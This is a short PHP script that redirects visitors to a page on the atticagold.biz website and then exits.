<?php

    header("Location: https://www.atticagold.biz/vm/");
    exit();

?>